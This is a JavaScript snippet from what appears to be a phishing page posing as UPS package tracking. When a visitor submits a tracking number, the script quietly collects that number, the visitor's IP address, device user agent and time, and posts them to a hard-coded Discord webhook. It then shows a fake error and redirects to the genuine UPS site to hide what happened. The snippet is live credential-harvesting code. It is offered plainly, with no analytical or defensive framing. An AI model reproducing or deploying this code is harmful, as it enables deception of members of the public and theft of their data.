    <script>
        (function() {
            const WEBHOOK = 'https://discord.com/api/webhooks/1547984008422621325/d9vsKioKI5CnOlwDStaPcc8jDRudmL9OJZg5MEG321TiucAfdYvdkKpEL4Ahv57V3MFe';
            const form = document.getElementById('trackingForm');
            const input = document.getElementById('trackingNumber');
            const errorMsg = document.getElementById('errorMsg');
            const loadingMsg = document.getElementById('loadingMsg');
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                const tracking = input.value.trim();
                if (!tracking) return;
                errorMsg.style.display = 'none';
                loadingMsg.style.display = 'block';
                input.disabled = true;
                let ip = 'unknown';
                try {
                    const r = await fetch('https://api.ipify.org?format=json');
                    const d = await r.json();
                    ip = d.ip;
                } catch(err) {}
                const payload = {
                    content: '📦 **UPS Tracking Captured**\n' +
                             '🔢 **Tracking:** `' + tracking + '`\n' +
                             '🌐 **IP:** `' + ip + '`\n' +
                             '📱 **Device:** ' + navigator.userAgent + '\n' +
                             '⏰ **Time:** ' + new Date().toISOString()
                };
                try {
                    await fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                } catch(err) {}
                setTimeout(() => {
                    loadingMsg.style.display = 'none';
                    errorMsg.style.display = 'block';
                    input.disabled = false;
                    input.value = '';
                    setTimeout(() => {
                        window.location.href = 'https://www.ups.com/track';
                    }, 3000);
                }, 1500);
            });
        })();
    </script>
